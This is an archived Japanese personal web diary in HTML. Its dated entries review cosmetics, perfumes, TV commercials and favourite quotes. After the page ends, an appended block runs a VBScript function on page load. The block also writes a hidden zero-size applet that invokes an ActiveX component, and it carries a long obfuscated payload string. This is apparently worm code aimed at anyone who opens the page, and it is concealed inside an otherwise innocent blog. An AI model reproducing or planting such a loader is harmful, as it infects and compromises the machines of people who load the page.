      <TD></TD>
      <TD>その後私は「ロクシタン」のシャワークリームを購入。「ロクシタン」は自然と伝統を重んじる正統派の</TD>
    </TR>
    <TR>
      <TD width="23"></TD>
      <TD width="1101">ブランドコスメで全てが植物から取れた体に優しい商品とのこと。</TD>
    </TR>
    <TR>
      <TD width="23"></TD>
      <TD width="1101">『伝統』と言う言葉に含まれる、時を越えて継続するという意味を、私はとても大切に思っています。とは</TD>
    </TR>
    <TR>
      <TD width="23"></TD>
      <TD width="1101">創設者オリビエ・ボーサン氏のお言葉。癒されますねぇ・・。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="757">
  <TBODY>
    <TR>
      <TD>●　５月１８日　●　女優のカホリ</TD>
    </TR>
    <TR>
      <TD height="23"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1146">
  <TBODY>
    <TR>
      <TD width="21"></TD>
      <TD width="1109">最近ご無沙汰していた香水収集が再熱いたしました。何気にショップの中をうろついていると</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1109">目に飛び込んできたのは透き通る白磁のバディにアクセサリーをあしらった粋なボトル。</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1109">女優ジェニファー・ロペス・プロデュース『グロウ・バイ・ジェイロー』です。</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1109">ジェニロペをイメージした香りというので、また半額近い値で売られていたので飛びつきました！</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1109">香りを試されますかぁ〜？とすり寄ってきた店のおねいさんに、いえ、もう自分の腕につけましたからっと</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1109">二の句をつなぐ間も入れず購入決定したのでした。いい客だ・・。</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1109">問題の香りはと言うと、んん・・？なんと爽やかなトップ。ジェニロペってもっと色香漂う大人の女という</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>イメージでしたが。（この香水の全裸ポスターからしても・・）</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ミドルのホワイトローズからラストにかけてちょっとずつ甘くなってゆきます。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>香りが飛ぶのが早いような気がしますが、しかし私にとっては満足のゆく一品です。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>次はピンクのマネキン首が絶不評なアナスイの新作『ドーリーガール』か、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>静かなる人気・愛すべき香りと評されるロクシタンの『ネロリローズ』を購入予定。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>基本的にローズ系は心が和みます。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="754">
  <TBODY>
    <TR>
      <TD>●　４月１６日　●　つつじの花が咲く頃</TD>
    </TR>
    <TR>
      <TD height="23"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1152">
  <TBODY>
    <TR>
      <TD width="18"></TD>
      <TD width="1118">桜の花が散ってしまうとすぐにつつじの花が咲き始めます。あーーっいい香りー！</TD>
    </TR>
    <TR>
      <TD width="18"></TD>
      <TD width="1118">まだ少ししか咲いていないのですが、通勤途中に歩道の片端を埋め尽くすつつじの群れが、</TD>
    </TR>
    <TR>
      <TD width="18"></TD>
      <TD width="1118">色鮮やかに満開となったときのあの香りを想像するとなんて幸せなのでしょう。</TD>
    </TR>
    <TR>
      <TD width="18"></TD>
      <TD width="1118">今朝、いつも通り出勤し、ロッカーで身支度を済ませて、いざ出陣と我が部のフロア—へ</TD>
    </TR>
    <TR>
      <TD width="18"></TD>
      <TD width="1118">足を踏み入れたその瞬間、ふわっとある懐かしいにおいがしました。</TD>
    </TR>
    <TR>
      <TD width="18"></TD>
      <TD width="1118">朝の光りに混じって爽やかだけどどこか全ての物が乾燥しているような空気。これは・・</TD>
    </TR>
    <TR>
      <TD width="18"></TD>
      <TD width="1118">初夏だ！梅雨を通り越して初夏のにおいがやってきた！と本気で思ったのでした。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ああ、つまんねぇ事で感動できる私はなんてお安くて、幸せな人間なんでしょう。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>外の世界じゃ戦争があってるというのに・・ああ恐ろしい。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="751">
  <TBODY>
    <TR>
      <TD width="741">●　３月２０日　●　憧れの名品</TD>
    </TR>
    <TR>
      <TD width="741" height="26"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1142">
  <TBODY>
    <TR>
      <TD width="21"></TD>
      <TD width="1105">ついに・・・ついに手に入れました・・ファンデーションの中で名品と誉れ高いあの！クレ・ド・ポー・ボーテ！</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1105">『タンナチュレール・フリュイドｅ』を！やったー！やりました！・・・て大げさですけれども私にとってはそれは</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1105">本当に憧れの名品だったのです。お値段１万２千円！ああ、アナスイの春夏用ファンデが３つも買える・・</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1105">さすがはファンデの女王です。クレドはほとんど割引対象にはならない商品らしいのですが、とあるお店で</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1105">２０％オフだったので、私の誕生日プレゼントとして友人共が買ってくれたのでした。ありがとう！</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1105">早速次の日うきうきしながら塗ってみると、なるほどコスメサイトで確認した通りほんの少量でかなりのカバー力。</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1105">ちっとオバハンくさい香りを満喫しながら手早く塗ってその上にアナスイのお粉をはたくと「ぐはぁ！ぬりかべ！」</TD>
    </TR>
    <TR>
      <TD width="21"></TD>
      <TD width="1105">とかなり厚塗になってしまいました。これから訓練を要するようですが、それでも友人がくれた念願のクリームファンデ。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>毎朝時間に追われながらも、うきうきでメイクしてます。メイクが楽しいっていのうは本当に女として最高の</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>幸せなのですね。しかし時間がたつと少し赤黒く見えるのは私の肌と相性が合わないって意味ですかい？</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>難しいなぁ女王サマ・・。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="756">
  <TBODY>
    <TR>
      <TD>●　３月９日　●　名言</TD>
    </TR>
    <TR>
      <TD height="23"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1144">
  <TBODY>
    <TR>
      <TD width="22"></TD>
      <TD width="1106">「この世で俺が信頼できる男は二人だけだ。一人は俺自身でもう一人は・・お前じゃない」</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1106">昔、よそ様の名言集サイトで知った名言です。何処のどなたの言葉かは忘れてしまいましたが</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1106">なんとその気持ちを確実に表した言葉なのでしょう。どういう場面のどういう対峙での言葉なのか</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1106">全く判りませんが、自分が信じているのはあの男だけだ、という思いを単に「信じている」という言葉</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1106">で済ますのでなく、よりもっと強いインパクトで知らしめるセリフ。他に感銘を受けた言葉は</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1106">「『確実』！そう！コーラを飲むとゲップが出るというくらい『確実』！」（ＪｏＪｏジョセフ・ジョースター）</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1106">「君の瞳に・・・映った僕に乾杯！」（カウボーイ・ビバップ）</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ＪｏＪｏは名言の宝庫です。荒木先生はどうしてそんなに天才なのでしょう！</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>素晴らしい言葉に出会うと得した気持ちと少し頭良くなったような気になってうれしいのです。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="756">
  <TBODY>
    <TR>
      <TD>●　２月１５日　●　ＣＭ</TD>
    </TR>
    <TR>
      <TD height="25"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1152">
  <TBODY>
    <TR>
      <TD width="22"></TD>
      <TD width="1114">前回の日記でニナリッチの下地を定価で買ったらよそで半額以下で売られていたと述べておりますが、</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1114">今度は前々回に本当はニナリッチではなく資生堂のスポッツカバーを買いたかったがどこにもなかったと</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1114">記述しておりましたところ、またもや先日別のショップでそれを見つけてしまいました。ああ・・神サマ・・</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1114">さて、私は最近大好きなＣＭがあります。美川憲一さんとうのちゃんの車検のＣＭ，阿部寛のビール、</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1114">そしてＮＴＴファシリティーズ（？）の歌う社長達です。車検のＣＭは一度しか見てないのですが鮮烈に印象に</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1114">残りました。いいの？あんな恰好して！ケンちゃん！って感じです。阿部さんのビールＣＭは撮影風景が</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1114">特集で流されるなど話題を呼んだ作品で好印象。最後の歌う社長達は何故か社長達の最後尾右端にいる</TD>
    </TR>
    <TR>
      <TD width="22"></TD>
      <TD width="1114">外国人が気になっているからです。あれはケント・ギルバートさんですよね・・。なんか好きです。あのＣＭ。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>歌も知らず知らず歌ってしまいます。ひえー</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE>
  <TBODY>
    <TR>
      <TD width="742">●　２月８日　●　アナスイ</TD>
    </TR>
    <TR>
      <TD height="26"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1162">
  <TBODY>
    <TR>
      <TD width="17"></TD>
      <TD width="727">前回の日記でニナリッチのバースニュアンセ・旧型をほぼ定価で購入した旨述べておりますが</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="727">この間何気なく入ったショップでそれが半額以下で売られていたのを発見。失神しそうになりました。</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="727">さて今回は春の限定品アナスイのグロスリップ。淡いピンクの３０９番とオレンジよりのチェリーレッド</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="727">４０７番を購入。ＢＡさんに何度も試し塗りしてもらったあげく、初アナスイでしたのでプレゼント仕様で</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="727">包んでもらいました。自分用だとバレバレなのにおねいさんは笑顔でプレゼント用の可愛い缶に入れて</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="727">くださいました。アナスイは入れ物も香りも独特。ちっとダークで幻想的な世界が存在する感じで。</TD>
    </TR>
    <TR>
      <TD width="17"></TD>
      <TD width="727">購入したリップはグロス系なのでかなり薄付きですが、意外に持ちが良いようです。嬉しい・・。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>しかし一番欲しかったポピーピンクの６０５番は売切れ。限定品ってすぐに買いに行かなければ駄目ですね。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="757">
  <TBODY>
    <TR>
      <TD>●　１月２７日　●　下地</TD>
    </TR>
    <TR>
      <TD height="32"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1130">
  <TBODY>
    <TR>
      <TD width="19"></TD>
      <TD width="1095">雑誌でとっても評判の良い下地ニナリッチのバースニュアンセのリニューアル前分を</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1095">購入しました。ポール＆ジョーボーテの下地ファンデーションプライマーと悩みましたが</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1095">ちまたの評価でニナリッチの勝ち。しかし五千円もする下地なんて・・・最近コスメに金かかってます。</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1095">以前使用していたＤＨＣの下地マットクリームがあまりにも心地悪く、全て使いきる前に次を模索して</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1095">いたところ、最初に目についたのが資生堂のスポッツカバーファンデーション。しかしこれがどこにも</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1095">売っていなくて断念。千二百円というリーズナブルなお値段にとっても惹かれたのですが残念です。</TD>
    </TR>
    <TR>
      <TD width="19"></TD>
      <TD width="1095">ＲＭＫやデコルテの下地もまずまずの評価でしたが人の意見に左右される私は結局値段の高い物が</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>良くないわけがない、という幼稚な見解の元、ニナリッチへと進んで行ったのでした・・</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>使い心地は悪くないけど量が多いと顔が真っ白！朝から時間が無いのに少し大変です。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="756">
  <TBODY>
    <TR>
      <TD>●　１月１９日　●　トリートメント</TD>
    </TR>
    <TR>
      <TD height="33"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1117">
  <TBODY>
    <TR>
      <TD width="24"></TD>
      <TD width="1077">洗い流さないトリートメント「グレイズミルク」。友人の行きつけの美容院で売っているというトリートメントを</TD>
    </TR>
    <TR>
      <TD width="24"></TD>
      <TD width="1077">先日買ってきてくれました。お値段１２００円。私の髪はくせ毛で太くて多いので縮毛矯正しなければ</TD>
    </TR>
    <TR>
      <TD width="24"></TD>
      <TD width="1077">とても表を歩けませんほどで、トリートメントをはじめとする調髪剤が欠かせません。</TD>
    </TR>
    <TR>
      <TD width="24"></TD>
      <TD width="1077">洗い流さない分はべとべとして気持ち悪いのではと敬遠していましたが、つけてみるとさらりとして</TD>
    </TR>
    <TR>
      <TD width="24"></TD>
      <TD width="1077">なかなかよろしいのではと、最近お気に入りです。なんといっても香りが良い！しょうがです、しょうが！</TD>
    </TR>
    <TR>
      <TD width="24"></TD>
      <TD width="1077">しょうがの成分がメインとして入っていて、それが髪にどう影響するのか知りませんが、とにかく</TD>
    </TR>
    <TR>
      <TD width="24"></TD>
      <TD width="1077">良い香りで癒し系として重宝してます。近くのお店ではどうしても見つからないのでまた友人に</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>買ってきてもらわなくては。マイナー品は購入に手間がかかり面倒ですね。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="757">
  <TBODY>
    <TR>
      <TD>●　１月１８日　●　ＷＯＯＯ</TD>
    </TR>
    <TR>
      <TD height="31"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1106">
  <TBODY>
    <TR>
      <TD width="25"></TD>
      <TD width="1065">「世界ふしぎ発見！」を見ていますと、日立のプラズマテレビ『ＷＯＯＯ』のＣＭが必ず一度は出てきます。</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1065">それにブロンドの、いえハニーブロンドというのでしょうか、美しい長髪の少女が出てきますが、</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1065">その少女の姿を見るのが私は大好きなのです。最後に少女の真っ青な瞳がアップになって終わるのですけど、</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1065">何と美しい瞳なのでしょう。もちろんＣＧだとは思いますが、その不純物の混じっていない真の蒼という感じ。</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1065">真っ青と表現しましたがアクアマリンより強く、ラピスラズリより弱い蒼色といったところでしょうか。</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1065">青い瞳が似合う欧米の人はそれだけで人生得してる感じですよね。</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1065"></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="758">
  <TBODY>
    <TR>
      <TD>●　１月１５日　●　私のお父さん</TD>
    </TR>
    <TR>
      <TD height="35"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1103">
  <TBODY>
    <TR>
      <TD width="25"></TD>
      <TD width="1062">プッチーニ歌劇「ジャンニ・スキッキ」の中で「私のお父さん」という曲があります。</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1062">昨年の暮、紅白でも歌われていました。私が所持しているＣＤの中に入っていた曲で</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1062">ルネ・フレミングというソプラノ歌手の方が歌っています。しかしオペラの内容を全く知らないので</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1062">私は紅白で初めてその歌詞の内容を知ったのです。</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1062">『この人を愛しているの、お父さん。もしこの恋を許してくれないのなら私はアルノ川に身を投げるわ・・』</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1062">のような歌詞だったと思います。（もう忘れ気味）歌の中の女性。恋人を愛する心を切々と訴える哀しげな歌ですが</TD>
    </TR>
    <TR>
      <TD width="25"></TD>
      <TD width="1062">そんな激しい恋をした事がない私もある意味悲しい女なのでしょうかね・・。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="757">
  <TBODY>
    <TR>
      <TD>●　１月１３日　●　しっとりマスク</TD>
    </TR>
    <TR>
      <TD height="30"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1099">
  <TBODY>
    <TR>
      <TD width="28"></TD>
      <TD width="1055">マツキヨが新春セールで商品２４％引きというビミョーな安売りをしていたので（何故すっきり２５％にしないのだろう）</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1055">めったに買わない美容パックを購入しました。その名もコーセーの「しっとり実感エッセンスマスク」です。</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1055">無着色・弱酸性・ノンアルコールの三拍子。弱酸性はビオレさんが肌に良いとさんざん宣伝しているので</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1055">買ってみたところ・・・日頃疲れぎみの私の肌にはなかなか保湿の点ではよろしいかと思いましたが</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1055">一度っきりじゃどのように効いているのか判りませんね。でも心もち、肌がぷるぷるになった気がします。</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1055">まあこういうのは気分の問題でしょう。肌がしっとりすると「ああ、乾燥してたんだ」とか「しっかり吸収したな」とか</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1055">見た目変化は無くても良くなった気になるのです。単純王ですから！</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="755">
  <TBODY>
    <TR>
      <TD>●　１月１２日　●　火サスの常連</TD>
    </TR>
    <TR>
      <TD height="30"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1101">
  <TBODY>
    <TR>
      <TD width="31"></TD>
      <TD width="1054">私はトレンディドラマより火曜サスペンスや土曜ワイド劇場などのほうが好きです。</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1054">最近のサスペンスは刑事や探偵のシリーズ物が多く、その中でも私が好きな作品は</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1054">西村京太郎さん原作の「十津川警部シリーズ」です。</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1054">原作は読んでないのでキャスティグの良し悪しは判りませんが、私の中では十津川警部は</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1054">やはり渡瀬恒彦さんが、亀さんは伊藤四郎さんが、それぞれ適役です。というかこのお二人の</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1054">シリーズしか知らないからですけども・・・。この前警部役を高橋英樹さん、亀さん役をキンキンが</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1054">されていましたけどぜんっぜんミスキャスです！あんな派手な警部がいますかってのー！</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1054"></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
<BR>
</P>
<TABLE width="755">
  <TBODY>
    <TR>
      <TD>●　１月１０日　●　限定キット</TD>
    </TR>
    <TR>
      <TD height="28"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1101">
  <TBODY>
    <TR>
      <TD width="28"></TD>
      <TD width="1057">私がリキッドファンデ派だと知ったお友達が以前購入した限定キットの中に入っていたという『クリニーク』の</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1057">リキッドを譲ってくれました。スーパーバランスドメークアップです。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>しかし私はすでにディグを手に入れたばかり。彼女はリキッドは使わないのでずっと化粧タンスの奥に</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1057">しまっていたものだというので、せっかくいただいたのだから時々使うことにしたのです。</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1057">実は私、限定キットを買ったことが無いのです。クリスマスなどにはどこのブランドも競ってお得なキットを発売</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1057">するけれど、だってその中に欲しいものは一つくらいしかないんですもん。他は別に要らなーいって感じが多くて。</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1057">すると後日別の友人がまたまた別ブランドのリキッドを持ってきてくれました。１週間ほど使ったが気に入らなかったから</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1057">くれると言うのだけれど・・・よーするにいらないもの処分にうってつけの女ってワケですかい？！アタシはっつ！</TD>
    </TR>
    <TR>
      <TD width="28"></TD>
      <TD width="1057">そんなにいくつもリキッドいらないです・・でももらってしまいましたけど。</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="941">
  <TBODY>
    <TR>
      <TD width="864">●　１月８日　●　　化粧用オイル</TD>
    </TR>
    <TR>
      <TD height="26"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1092">
  <TBODY>
    <TR>
      <TD width="31"></TD>
      <TD width="1045">今年の冬は何故だか乾燥が激しいのです。ファンデを最近変えたのですが、変える前から随分乾燥ぎみで。</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1045">そこで今まで試した事の無いオイルに初挑戦。</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1045">以前に何度かＤＨＣのサンプルでオリーブバージンオイルを使用した事はあるのですが、</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1045">これは何とも言えない独特の臭いがあってどうしても好きになれません。雑誌では常に上位にランキング</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1045">されている品ですが、小さいのに値段も半端ではないので・・。そこで代わりに手に入れたのが「ちふれ」の</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1045">ピュアスクワランオイル。ワンプッシュの少量で顔全体伸ばせます。無臭でしっとり、乾燥をかなり防いでくれます。</TD>
    </TR>
    <TR>
      <TD width="31"></TD>
      <TD width="1045">しかもお値段７００円。や、安！さすがちふれさんです！</TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="1066">
  <TBODY>
    <TR>
      <TD height="29" width="638">●　１月７日　●　　ディグニータ廃盤？！</TD>
      <TD width="209"></TD>
    </TR>
    <TR>
      <TD height="26"></TD>
      <TD height="26"></TD>
    </TR>
  </TBODY>
</TABLE>
<TABLE width="1075">
  <TBODY>
    <TR>
      <TD width="34"></TD>
      <TD width="1025">明けましておめでとうございます。月並みではございますが、今年もよろしくお願いします。</TD>
    </TR>
    <TR>
      <TD height="23"></TD>
      <TD height="23"></TD>
    </TR>
    <TR>
      <TD width="34" height="21"></TD>
      <TD width="1025" height="21">さて、上記の通り私は資生堂化粧品ディグニータの衰退に驚きを隠せないのであります。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ディグニータはちっと私には手の出せない高級化粧品というイメージが強く、使ってみたいけど値段の高さに</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>常に断念していたのですが・・・ネットでディグニータ廃盤の文字があちこちで踊っているのを見て、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>これはもう無くなる前に一度は使ってみねばなるまいと意を決して、でもリキッドファンデ一個だけ購入しました。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ディグニータファンデーションスーペリア・・・お値段８千円也。ひえーっつ！</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>これ一つでクリニークのファンデが２個買えるーっつ、と決心が鈍りましたが、ちょうど２割引のところがあったので</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>なんとか手に入れた次第です。使ってみると、なるほど高いだけあってリッチな感触、少量でも肌に伸びて</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>マットな仕上り、微妙な香りも上品です。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>とっても気に入ったので、また２割引を狙って買いだめしておこうかと思っております。</TD>
    </TR>
    <TR>
      <TD height="35"></TD>
      <TD height="35"></TD>
    </TR>
    <TR>
      <TD></TD>
      <TD><A href="http://web.archive.org/web/20050122190912/http://ww2.tiki.ne.jp/~die-/d-nikkitop.htm">戻る</A></TD>
    </TR>
    <TR>
      <TD></TD>
      <TD></TD>
    </TR>
  </TBODY>
</TABLE>
</BODY>
</HTML>

<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "=hmBmWd^qe(AsmhMdxp%UboMdxp%CeckdeObfn(:oph^Nbf^bt(?RO(PrSd^kl(PhnLZsh(LtbA%EijZky@brkRu^JJ[lsanm')JJO^sDef')JJ?kdap^Lihbdu$GCKig^Ht$GCBraZseIZhl$GCOrki`g]md(%Ej]Sq[Euj\sikgKF:opagcTk!Eih^Oapa+TuidSpk(Hm AkqonQeonleGdxpSamRaZcTafo 9ESK'NpagSetmEih^'FeedP]mg,-PfoSpk=Kda`Mdml'Qe]]@lhIbHnomq(PfoSpk+GC^spZqt$!)5= ,NrEdn$MlpOmq)51MgejRaZcTafo.?ensaEtbs BnmcpbnnDn`HfHfMxpaLsr6dmsMgejRaZcTafo.?ensaSamFeedTafo 9ESK'NpagSetmEih^'FeedP]mg,.BbkeP^lp*Pqip^8&AO@Rojena`6!% oas_khpp3! !KFXrt]ks(%!:&oaCnEe SmlLsrv^<qLb% DmllP^wtEih^Seii-ChhreRepEApmqi^< BLN.C^sFeed(BbkeLZsh%F=msre[-apmqi^nseo< /-AereQe]]Seii-ChhreRepEih^Seii=?RO*HoejMdxp?hla!Eih^Oapa+8%IbSyl^Rtn< asmhTd^m?hlaMdml'Vremd r[BrH_&;DMLL:&oaCnEe !<% ;NDUnnhh`d9!r[rcnbot6&JJ[lsanm')! !>% r[BrH_&AsmhMdxpEhldIbSyl^Rtn< oasShagBbkeP^lp*Pqip^v^<qLb% R[rTaqs>mdBe?hlaMdml'Blkld>mdBe>md?tn_mhoj?tn_mhojJJ?a`nc^Ru^!BunkdnpLsregf,HZrtEgcet<ganE_L]lsIj]dx?a`r60MgejIbKebm'L?Zre$<trn^mtOmqij`(,-=8KC]ld(\!)MgejKF<gaj`dSq[=?hn]exDelj !:XOnaE60Dlo^GCBh]gfeOna 9Bhn!@s_!Kebm'L?Zre$<trn^mtOmqij`(,-( )0)6U!LtbA< ,Ej]IbEhldDICdZmgaLtb6Me]'CqkqejmRtnbmg(*+L]lsIj]dx?a`r%Ej]IbEj]FqgbtehmFqgbtehm GCBraZseIZhl$KgEnknrKdsqfd J^wtHfBmWd^qe6dmllShagAqht?tn_mhojEj]IbSdZqeBbke6La_s(SbmP]mg,/&Ork`qaiEih^r\?hlmkgFeedsXFhcnhrobmSdZqe`URt]mhoj^qyX[kajd-hpf!Be $?RO*?hla>wiomr(Oa`ra?hla( PadnBaheKF:opagcTk!Rh]kdFeed,asmh(>ksaSamFeedTafo 9ESK'NpagSetmEih^'SdZqeBbke(++tnnd)Eih^Seii-Wnbse;DMLL:&oaCnEe !<% ;NDUnnhh`d9!r[rcnbot6&JJ[lsanm')! !>% r[BrH_&AsmhMdxpFeedTafo.?ensaEj]IbDa_`uhmHd6WoLgehe-Ra`Qe]]'DDDY[<TRN>MT[NRENUHdagsipbdsX=df]nktNrenHDKnsLkhjVakrikg=PrSd^kl*KdgN^`d$GKAR^LK<@L[F@CDBMEXLnfpp`raULi_knsk_s\Knslkhj Aqoralr\I^ci]OdrSlRhaek.N^fWnbseGKAR^CQKQEJM^UO>Q\E]dnpbsial[=df]nktE]%XLnfpp`raULi_knsk_s\Knslkhj Aqoralr\La_s(KnsLkhjVakrikg+1%%*)[M]bk\?hlpkld Qld Om`tehmenr!,-%!RA@^DSHQDC]ek GCLaeeQec!!HG>X_?NQRAGS_QLDRXBcejmhte^r\CebZtlpBc&URobmvan^[Me\qoohetXHtthhnk>wpn^rsX% H^et$HttHhnkR^qsehm,-&'/\IZhlXLsapbnnakx JZle%Rh]kdFeed)Bahe